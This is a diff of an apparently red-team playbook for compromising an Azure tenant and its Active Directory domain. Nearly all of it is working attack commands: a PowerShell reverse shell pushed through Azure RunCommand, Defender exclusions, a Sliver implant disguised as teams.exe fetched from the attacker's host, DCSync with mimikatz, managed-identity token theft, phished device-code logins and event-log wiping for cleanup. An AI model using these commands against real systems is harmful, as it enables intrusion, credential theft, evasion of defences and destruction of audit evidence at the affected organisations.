@@ -78,17 +78,16 @@ For HTTPS too:
 ./start.sh --domain cdn.yourdomain.com
 ```
 
-### 1c: Install Armory Extensions
+### 1c: Armory Extensions
 
-Inside the Sliver console:
+`start.sh` auto-installs these on first run (marker: `~/.sliver/.armory_installed`):
+- windows-credentials, kerberos, situational-awareness
+- windows-pivot, windows-bypass
+- .net-pivot, .net-recon, .net-execute
+
+To manually install more:
 ```
-armory install windows-credentials
-armory install kerberos
-armory install situational-awareness
-armory install windows-pivot
-armory install windows-bypass
-armory install .net-pivot
-armory install .net-recon
+armory install <bundle-name>
 ```
 
 ---
@@ -111,106 +110,156 @@ You now have `/tmp/teams.exe` — AES-encrypted, code-signed Sliver beacon.
 
 ---
 
-## Step 3: Get ARM Token
+## Step 3: Authenticate with Az CLI
+
+### 3a: Service Principal Login
 
 ```bash
-# Service Principal
-curl -X POST "https://login.microsoftonline.com/TENANT/oauth2/token" \
-  -d "grant_type=client_credentials&client_id=CLIENT_ID&client_secret=SECRET&resource=https://management.azure.com"
+# Login with SP credentials (client ID + secret + tenant)
+az login --service-principal \
+    --username "CLIENT_ID_HERE" \
+    --password "CLIENT_SECRET_HERE" \
+    --tenant "TENANT_ID_HERE"
 
-# Save the token
-export TOKEN="eyJ0eX..."
-export SUB="5152d66b-be33-42c3-b579-d9f723849d41"
-export RG="RGCORPSERVERS"
+# Example with real values:
+az login --service-principal \
+    --username "a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
+    --password "MySecretValue123" \
+    --tenant "MngEnvMCAP969165.onmicrosoft.com"
+```
+
+### 3b: Device Code Flow (Interactive — Useful for Phished Tokens)
+
+```bash
+az login --use-device-code --tenant "TENANT_ID_HERE"
+# Opens a URL — enter the code shown, authenticate as the target user
+```
+
+### 3c: Managed Identity (From Inside an Azure VM)
+
+```bash
+az login --identity
+```
+
+### 3d: Set Subscription + Verify
+
+```bash
+# Set the target subscription
+az account set --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9"
+
+# Verify you're authenticated
+az account show -o table
+
+# List VMs you can access
+az vm list -g RGCORPSERVERS -o table
+
+# Check your role assignments
+az role assignment list --assignee "CLIENT_ID" --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" -o table
+```
+
+### 3e: Install Az CLI (If Not Present)
+
+```bash
+# Kali/Ubuntu
+curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
 ```
 
 ---
 
-## Step 4: Deploy Implant via RunCommand
+## Step 4: Get a Shell via RunCommand
 
-### 4a: Try Direct Drop
+Start with a reverse shell first — faster to iterate, and lets you add Defender exclusions before dropping the real implant.
 
-```bash
-# Base64 encode the implant
-B64=$(base64 -w0 /tmp/teams.exe)
-
-# Deploy via RunCommand v2
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/deploy?api-version=2023-07-01" \
-  -d "{
-    \"location\": \"eastus2\",
-    \"properties\": {
-      \"source\": {\"script\": \"\$b=[Convert]::FromBase64String('$B64');[IO.File]::WriteAllBytes('C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\teams.exe',\$b);Start-Process 'C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\teams.exe'\"},
-      \"timeoutInSeconds\": 86400,
-      \"asyncExecution\": true
-    }
-  }"
-
-# Poll for result
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/deploy?\$expand=instanceView&api-version=2023-07-01" \
-  | jq '.properties.instanceView'
-```
-
-Or use the helper script:
-```bash
-./deploy-runcommand.sh --token $TOKEN --sub $SUB --rg $RG --vm blueHttpServer --implant-url http://YOUR_C2/teams.exe
-```
-
-### 4b: If Defender Blocks — Fallback NC Shell
-
-If the implant gets caught by Defender, get a basic nc shell first:
+### 4a: Start NC Listener on Kali
 
 ```bash
-# Start nc listener on Kali
-nc -lvnp 4444
+nc -lvnp 8080
 ```
+
+### 4b: Deploy Reverse Shell via Az CLI
 
 ```bash
-# Deploy nc reverse shell via RunCommand
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/nc-shell?api-version=2023-07-01" \
-  -d '{
-    "location": "eastus2",
-    "properties": {
-      "source": {"script": "powershell -ep bypass -c \"$c=New-Object Net.Sockets.TCPClient('"'"'YOUR_C2_IP'"'"',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'"'"'PS> '"'"';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\""},
-      "timeoutInSeconds": 86400,
-      "asyncExecution": true
-    }
-  }'
+az vm run-command create \
+    --name "revshell-$(date +%s)" \
+    --vm-name "blueHttpServer" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --async-execution true \
+    --timeout-in-seconds 86400 \
+    --script '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);$w.WriteLine("PS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ");while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=(iex $cmd 2>&1|Out-String);$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.WriteLine("`nPS "+$env:COMPUTERNAME+"\"+(Get-Location).Path+"> ")}'
 ```
 
-### 4c: Add Defender Exclusion + Re-Drop Sliver
+You should get a shell back as `NT AUTHORITY\SYSTEM`.
 
-From the nc shell:
+### 4c: Add Defender Exclusion (From NC Shell)
+
 ```powershell
-# Add exclusion for our implant path
 Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
 Add-MpPreference -ExclusionProcess "teams.exe"
-
-# Verify exclusion took
 Get-MpPreference | Select -ExpandProperty ExclusionPath
+```
 
-# Now drop the Sliver implant (base64 decode or download)
+### 4d: Drop Sliver Implant (From NC Shell)
+
+```powershell
+# Create directory
+New-Item -Type Directory "C:\ProgramData\Microsoft\Network" -Force
+
+# Download from your C2/web server
+Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8888/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe" -UseBasicParsing
+
+# Or base64 decode if no HTTP path
 $b=[Convert]::FromBase64String("BASE64_HERE")
 [IO.File]::WriteAllBytes("C:\ProgramData\Microsoft\Network\teams.exe",$b)
+
+# Execute
 Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"
 ```
 
-Or add the exclusion via RunCommand directly:
+### 4e: Alternative — Direct Drop via Az CLI (If Defender Is Off)
+
+If you know Defender won't block (or exclusion is already set):
+
 ```bash
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/av-exclude?api-version=2023-07-01" \
-  -d '{
-    "location": "eastus2",
-    "properties": {
-      "source": {"script": "Add-MpPreference -ExclusionPath \"C:\\ProgramData\\Microsoft\\Network\"\nAdd-MpPreference -ExclusionProcess \"teams.exe\""},
-      "timeoutInSeconds": 30
-    }
-  }'
+# Base64 encode implant
+B64=$(base64 -w0 /tmp/teams.exe)
+
+az vm run-command create \
+    --name "deploy-$(date +%s)" \
+    --vm-name "blueHttpServer" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --async-execution true \
+    --timeout-in-seconds 86400 \
+    --script "\$b=[Convert]::FromBase64String('$B64');New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force|Out-Null;[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',\$b);Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
 ```
 
-Then re-run Step 4a.
+### 4f: Add Defender Exclusion via Az CLI (No Shell Needed)
+
+```bash
+az vm run-command create \
+    --name "exclude-$(date +%s)" \
+    --vm-name "blueHttpServer" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; Add-MpPreference -ExclusionProcess 'teams.exe'"
+```
+
+### 4g: List / Delete RunCommands (Cleanup — Max 25 Per VM)
+
+```bash
+# List all RunCommands on a VM
+az vm run-command list --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" -o table
+
+# Delete a specific one
+az vm run-command delete --name "revshell-1234567890" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
+
+# Check result of a RunCommand
+az vm run-command show --name "deploy-1234567890" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --expand instanceView
+```
 
 ---
 
@@ -404,54 +453,73 @@ portscan --host 10.1.0.20 --ports 445,5985,3389
 
 ## Step 12: DC Takeover via RunCommand
 
-We have Contributor on the subscription, so RunCommand works on the DC directly:
+We have Contributor on the subscription, so RunCommand works on the DC directly.
+
+### 12a: Full AD Dump
 
 ```bash
-# Full AD dump
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/dc-recon?api-version=2023-07-01" \
-  -d '{
-    "location": "eastus2",
-    "properties": {
-      "source": {"script": "Import-Module ActiveDirectory\nGet-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize\nGet-ADGroupMember \"Domain Admins\" | Select SamAccountName\nGet-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table"},
-      "timeoutInSeconds": 120
-    }
-  }'
+az vm run-command create \
+    --name "dc-recon-$(date +%s)" \
+    --vm-name "blueDC-01" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --timeout-in-seconds 120 \
+    --script "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | Format-Table -AutoSize; Get-ADGroupMember 'Domain Admins' | Select SamAccountName; Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | Format-Table"
 ```
 
-### DCSync (if you have a session on DC)
+Check the result:
+```bash
+az vm run-command show --name "dc-recon-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --expand instanceView
+```
+
+### 12b: DCSync (If You Have a Session on DC)
 
 ```
 mimikatz lsadump::dcsync /user:contoso\krbtgt
 mimikatz lsadump::dcsync /user:contoso\Administrator
 ```
 
-### Managed Identity Tokens
+### 12c: Deploy Sliver on DC via RunCommand
 
 ```bash
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/mi-token?api-version=2023-07-01" \
-  -d '{
-    "location": "eastus2",
-    "properties": {
-      "source": {"script": "$r=Invoke-WebRequest -Uri \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com\" -Headers @{Metadata=\"true\"} -UseBasicParsing; $r.Content"},
-      "timeoutInSeconds": 30
-    }
-  }'
+az vm run-command create \
+    --name "dc-implant-$(date +%s)" \
+    --vm-name "blueDC-01" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --async-execution true \
+    --timeout-in-seconds 86400 \
+    --script "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network'; New-Item -Type Directory 'C:\ProgramData\Microsoft\Network' -Force | Out-Null; Invoke-WebRequest -Uri 'http://YOUR_KALI_IP:8888/teams.exe' -OutFile 'C:\ProgramData\Microsoft\Network\teams.exe' -UseBasicParsing; Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"
 ```
 
-### EntraConnect ADSync
+### 12d: Managed Identity Tokens
+
+Steal MI tokens from any VM with managed identity assigned:
 
 ```bash
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueEntraC-01/runCommands/adsync?api-version=2023-07-01" \
-  -d '{
-    "location": "eastus2",
-    "properties": {
-      "source": {"script": "Get-ADSyncConnector | Select Name,Type | Format-Table\nGet-ADSyncScheduler | Format-List"},
-      "timeoutInSeconds": 60
-    }
-  }'
+az vm run-command create \
+    --name "mi-token-$(date +%s)" \
+    --vm-name "blueDC-01" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --timeout-in-seconds 30 \
+    --script "\$r=Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Headers @{Metadata='true'} -UseBasicParsing; \$r.Content"
+```
+
+### 12e: EntraConnect ADSync
+
+```bash
+az vm run-command create \
+    --name "adsync-$(date +%s)" \
+    --vm-name "blueEntraC-01" \
+    --resource-group "RGCORPSERVERS" \
+    --subscription "a985babf-347f-4ad4-bac5-510c6decd9d9" \
+    --location "westus3" \
+    --timeout-in-seconds 60 \
+    --script "Get-ADSyncConnector | Select Name,Type | Format-Table; Get-ADSyncScheduler | Format-List"
 ```
 
 ---
@@ -471,6 +539,8 @@ remote-schtaskscreate blueDBServer DiagCheck "C:\Windows\Temp\svc-update.exe"
 
 ## Step 14: Cleanup
 
+### 14a: Remove Persistence + Implants (From Sliver Sessions)
+
 ```
 # Remove persistence
 execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
@@ -489,13 +559,28 @@ execute -o "wevtutil cl Security"
 execute -o "wevtutil cl System"
 execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"
 
-# Delete RunCommands from Azure
-for CMD in deploy nc-shell av-exclude dc-recon mi-token adsync; do
-  curl -X DELETE -H "Authorization: Bearer $TOKEN" \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/$CMD?api-version=2023-07-01"
-done
-
 # Kill beacons
 rev2self
 exit
 ```
+
+### 14b: Delete All RunCommands from Azure
+
+```bash
+# List all RunCommands on each VM
+for VM in blueHttpServer blueDC-01 blueEntraC-01; do
+    echo "=== $VM ==="
+    az vm run-command list --vm-name "$VM" --resource-group "RGCORPSERVERS" -o table
+done
+
+# Delete specific RunCommands
+az vm run-command delete --name "revshell-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "deploy-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "exclude-TIMESTAMP" --vm-name "blueHttpServer" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "dc-recon-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "dc-implant-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "mi-token-TIMESTAMP" --vm-name "blueDC-01" --resource-group "RGCORPSERVERS" --yes
+az vm run-command delete --name "adsync-TIMESTAMP" --vm-name "blueEntraC-01" --resource-group "RGCORPSERVERS" --yes
+```
+
+**Note**: Max 25 RunCommands per VM. Delete old ones or Azure will reject new ones.
